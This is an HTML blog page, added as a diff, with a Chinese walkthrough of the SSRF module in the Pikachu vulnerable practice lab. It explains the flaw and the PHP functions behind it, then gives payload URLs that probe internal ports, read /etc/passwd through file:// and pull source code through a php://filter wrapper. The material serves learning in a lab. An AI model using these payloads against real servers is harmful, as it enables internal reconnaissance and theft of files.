@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu靶场系列-SSRF">
+<meta property="og:url" content="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/index.html">
+<meta property="og:site_name" content="欢 迎 光 临">
+<meta property="og:description" content="SSRF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110155943810.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110160353697.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110160502725.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110160606691.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110160659978.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110160821031.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110161236533.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110161323352.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110161521819.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110161737693.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110161709266.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110161737693.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110162913976.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110162949382.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110163139174.png">
+<meta property="article:published_time" content="2023-05-04T03:05:49.435Z">
+<meta property="article:modified_time" content="2023-05-04T03:05:49.435Z">
+<meta property="article:author" content="fn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images%5Cimage-20230110155943810.png">
+
+
+<link rel="canonical" href="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/","path":"2023/05/04/pikachu靶场系列/SSRF/","title":"pikachu靶场系列-SSRF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pikachu靶场系列-SSRF | 欢 迎 光 临</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">欢 迎 光 临</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">SSRF概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="nav-number">1.0.1.</span> <span class="nav-text">服务端请求伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.0.1.0.1.</span> <span class="nav-text">危害</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0SSRF%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-number">1.0.1.0.2.</span> <span class="nav-text">具体可能出现SSRF的地方</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="nav-number">1.0.1.0.3.</span> <span class="nav-text">漏洞验证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E6%B6%89%E5%8F%8A%E5%87%BD%E6%95%B0"><span class="nav-number">1.0.2.</span> <span class="nav-text">php涉及函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#file-get-contents"><span class="nav-number">1.0.2.0.1.</span> <span class="nav-text">file_get_contents()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fsockopen"><span class="nav-number">1.0.2.0.2.</span> <span class="nav-text">fsockopen()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#curl-exec"><span class="nav-number">1.0.2.0.3.</span> <span class="nav-text">curl_exec()</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF-CURL"><span class="nav-number">2.</span> <span class="nav-text">SSRF(CURL)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91web"><span class="nav-number">2.0.1.</span> <span class="nav-text">访问内网web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.0.2.</span> <span class="nav-text">探测主机信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.0.2.0.1.</span> <span class="nav-text">探测端口</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E4%B8%BB%E6%9C%BA%E6%96%87%E4%BB%B6"><span class="nav-number">2.0.3.</span> <span class="nav-text">读取主机文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.1.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF-file-get-content"><span class="nav-number">3.</span> <span class="nav-text">SSRF(file_get_content)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.0.0.0.1.</span> <span class="nav-text">探测主机端口</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">3.0.0.0.2.</span> <span class="nav-text">读取文件</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">fn</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">总计</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fn">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢 迎 光 临">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="pikachu靶场系列-SSRF | 欢 迎 光 临">
+      <meta itemprop="description" content="SSRF">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pikachu靶场系列-SSRF
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-04 11:05:49" itemprop="dateCreated datePublished" datetime="2023-05-04T11:05:49+08:00">2023-05-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">pikachu靶场系列</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">SSRF</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><h3 id="服务端请求伪造"><a href="#服务端请求伪造" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>字面意思就是伪造一个服务端请求，即攻击者借由服务端为跳板来攻击目标系统。</p>
+<p><img src="/images%5Cimage-20230110155943810.png" alt="image-20230110155943810"></p>
+<p>即我们能够访问到服务器，却访问不到目标机，但是服务器能访问到目标机</p>
+<p>比如</p>
+<p>服务器是某公司的公网边界机，目标机是该公司的内网机器</p>
+<h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><p>利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等</p>
+<h5 id="具体可能出现SSRF的地方"><a href="#具体可能出现SSRF的地方" class="headerlink" title="具体可能出现SSRF的地方"></a>具体可能出现SSRF的地方</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line"></span><br><span class="line">2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line"></span><br><span class="line">3.在线翻译：给网址翻译对应网页的内容</span><br><span class="line"></span><br><span class="line">4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line"></span><br><span class="line">5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</span><br><span class="line"></span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</span><br><span class="line"></span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line"></span><br><span class="line">8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line"></span><br><span class="line">9.邮件系统：比如接收邮件服务器地址</span><br><span class="line"></span><br><span class="line">10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</span><br><span class="line"></span><br><span class="line">11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span><br><span class="line"></span><br><span class="line">12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p>
+<h3 id="php涉及函数"><a href="#php涉及函数" class="headerlink" title="php涉及函数"></a>php涉及函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>
+
+<h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><img src="/images%5Cimage-20230110160353697.png" alt="image-20230110160353697"></p>
+<p>并且可以读取远程文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;http://www.baidu.com&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110160502725.png" alt="image-20230110160502725"></p>
+<h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p><img src="/images%5Cimage-20230110160606691.png" alt="image-20230110160606691"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp = fsockopen(&quot;www.baidu.com&quot;, 80, $errno, $errstr, 30);</span><br><span class="line">if (!$fp) &#123;</span><br><span class="line">    echo &quot;$errstr ($errno)&lt;br /&gt;\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $out = &quot;GET / HTTP/1.1\r\n&quot;;</span><br><span class="line">    $out .= &quot;Host: www.baidu.com\r\n&quot;;</span><br><span class="line">    $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    while (!feof($fp)) &#123;</span><br><span class="line">        echo fgets($fp, 128);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110160659978.png" alt="image-20230110160659978"></p>
+<h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><p>用于执行一个cURL会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;http://www.baidu.com&quot;);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110160821031.png" alt="image-20230110160821031"></p>
+<h1 id="SSRF-CURL"><a href="#SSRF-CURL" class="headerlink" title="SSRF(CURL)"></a>SSRF(CURL)</h1><p>起一台内网主机用于测试</p>
+<p><img src="/images%5Cimage-20230110161236533.png" alt="image-20230110161236533"></p>
+<p>点击后发现url指定了服务器访问的url，并将结果返回到前端</p>
+<p><img src="/images%5Cimage-20230110161323352.png" alt="image-20230110161323352"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>结果返回到前端</p>
+<p><img src="/images%5Cimage-20230110161521819.png" alt="image-20230110161521819"></p>
+<h3 id="访问内网web"><a href="#访问内网web" class="headerlink" title="访问内网web"></a>访问内网web</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110161737693.png" alt="image-20230110161737693"></p>
+<h3 id="探测主机信息"><a href="#探测主机信息" class="headerlink" title="探测主机信息"></a>探测主机信息</h3><h5 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com:4444</span><br></pre></td></tr></table></figure>
+
+<p>baidu未开4444端口，所以会一直加载</p>
+<p><img src="/images%5Cimage-20230110161709266.png" alt="image-20230110161709266"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110161737693.png" alt="image-20230110161737693"></p>
+<p>192.168.28.150主机开启22222端口</p>
+<h3 id="读取主机文件"><a href="#读取主机文件" class="headerlink" title="读取主机文件"></a>读取主机文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>更多利用方式参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>
+<h1 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h1><p>利用方式和curl的类似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110162913976.png" alt="image-20230110162913976"></p>
+<h5 id="探测主机端口"><a href="#探测主机端口" class="headerlink" title="探测主机端口"></a>探测主机端口</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=http://192.168.28.150:22222</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110162949382.png" alt="image-20230110162949382"></p>
+<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=../../index.php</span><br></pre></td></tr></table></figure>
+
+<p>查看页面源代码</p>
+<p><img src="/images%5Cimage-20230110163139174.png" alt="image-20230110163139174"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/" rel="prev" title="pikachu靶场系列-不安全的URL跳转">
+                  <i class="fa fa-chevron-left"></i> pikachu靶场系列-不安全的URL跳转
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/sql%E6%B3%A8%E5%85%A5/" rel="next" title="pikachu靶场系列-sql注入">
+                  pikachu靶场系列-sql注入 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fn</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>-->
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
